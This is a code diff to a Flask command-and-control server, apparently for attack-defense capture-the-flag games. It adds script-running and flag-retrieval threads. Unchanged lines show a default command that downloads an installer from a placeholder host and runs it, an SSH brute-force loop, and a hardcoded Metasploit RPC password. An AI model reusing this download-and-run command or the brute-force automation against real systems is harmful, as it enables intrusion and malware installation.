@@ -20,8 +20,8 @@ from flask_sqlalchemy import SQLAlchemy
 PORT = 80
 DEBUG = True
 MSFRPC_PW = "tHVdf97UqDZxmJuh"
-TEMPLATE_DIR = "templates"
-SCRIPTS_DIR = "scripts"
+TEMPLATE_DIR = "./templates/"
+SCRIPTS_DIR = "./scripts/"
 DB_FILE = "c2.db"
 LOG_FILE = "c2.log"
 THREADS = []
@@ -35,8 +35,10 @@ DEFAULT_MALWARE_INSTALL = "curl -o installer http://CHANGE_ME/i && chmod +x inst
 DEFAULT_STATUS_PWNED_TIMEOUT = "300"
 DEFAULT_STATUS_FLAGS_TIMEOUT = "300"
 DEFAULT_STATUS_INTERVAL = "10"
+DEFAULT_RUN_SCRIPTS_INTERVAL = "30"
 DEFAULT_SSH_BRUTEFORCE_INTERVAL = "30"
 DEFAULT_SSH_BRUTEFORCE_TIMEOUT = "5"
+DEFAULT_RUN_FLAG_RETRIEVALS_INTERVAL = "30"
 DEFAULT_SPAM_INTERVAL_MIN = "5"
 DEFAULT_SPAM_INTERVAL_MAX = "20"
 DEFAULT_SPAM_TIMEOUT = "5"
@@ -67,10 +69,13 @@ def main():
     add_setting("status_flags_timeout", DEFAULT_STATUS_FLAGS_TIMEOUT,
                 "Timeout, in seconds, when to stop assuming box is getting flags")
     add_setting("status_interval", DEFAULT_STATUS_INTERVAL, "Seconds to wait between each status check")
+    add_setting("run_scripts_interval", DEFAULT_RUN_SCRIPTS_INTERVAL, "Seconds to wait between running scripts")
     add_setting("ssh_bruteforce_interval", DEFAULT_SSH_BRUTEFORCE_INTERVAL,
                 "Seconds to wait between each SSH bruteforce")
     add_setting("ssh_bruteforce_timeout", DEFAULT_SSH_BRUTEFORCE_TIMEOUT,
                 "Seconds to wait for timeout during SSH bruteforce")
+    add_setting("run_flag_retrievals_interval", DEFAULT_RUN_FLAG_RETRIEVALS_INTERVAL,
+                "Seconds to wait between running flag retrievals")
     add_setting("spam_interval_min", DEFAULT_SPAM_INTERVAL_MIN, "Minimum seconds to wait between each spam")
     add_setting("spam_interval_max", DEFAULT_SPAM_INTERVAL_MAX, "Maximum seconds to wait between each spam")
     add_setting("spam_timeout", DEFAULT_SPAM_TIMEOUT, "Seconds to wait for timeout during spamming")
@@ -82,7 +87,9 @@ def main():
 
     # Start threads
     THREADS.append(Thread(target=status, name="status"))
+    THREADS.append(Thread(target=run_scripts, name="run_scripts"))
     THREADS.append(Thread(target=ssh_bruteforce, name="ssh_bruteforce"))
+    THREADS.append(Thread(target=run_flag_retrievals, name="run_flag_retrievals"))
     THREADS.append(Thread(target=spam, name="spam"))
     for thread in THREADS:
         thread.start()
@@ -712,6 +719,36 @@ def status():
         time.sleep(interval)
 
 
+def run_scripts():
+    # Continue running scripts
+    while True:
+
+        # Get settings from database
+        try:
+            interval = int(Setting.query.get("run_scripts_interval").value)
+        except:
+            log("run_scripts", "Invalid run_scripts_interval setting")
+            interval = DEFAULT_RUN_SCRIPTS_INTERVAL
+
+        # Get all scripts
+        scripts = Script.query.all()
+
+        # Get all boxes
+        boxes = Box.query.all()
+
+        # Iterate over scripts
+        for script in scripts:
+
+            # Check if script exists
+            if not os.path.isfile(SCRIPTS_DIR + script.path):
+                log("run_scripts", f"script {script.path} does not exist")
+                continue
+
+        # Wait until next run
+        log("run_scripts", f"sleeping for {interval} seconds")
+        time.sleep(interval)
+
+
 def ssh_bruteforce():
     # Continue trying
     while True:
@@ -776,6 +813,25 @@ def ssh_bruteforce():
             # Wait until next try
             log("ssh_bruteforce", f"sleeping for {interval} seconds")
             time.sleep(interval)
+
+
+def run_flag_retrievals():
+    # Continue checking
+    while True:
+
+        # Get settings from database
+        try:
+            interval = int(Setting.query.get("run_flag_retrievals_interval").value)
+        except:
+            log("run_flag_retrievals", "Invalid run_flag_retrievals_interval setting")
+            interval = DEFAULT_RUN_FLAG_RETRIEVALS_INTERVAL
+
+        # Get all boxes
+        boxes = Box.query.all()
+
+        # Wait until next check
+        log("run_flag_retrievals", f"sleeping for {interval} seconds")
+        time.sleep(interval)
 
 
 def spam():
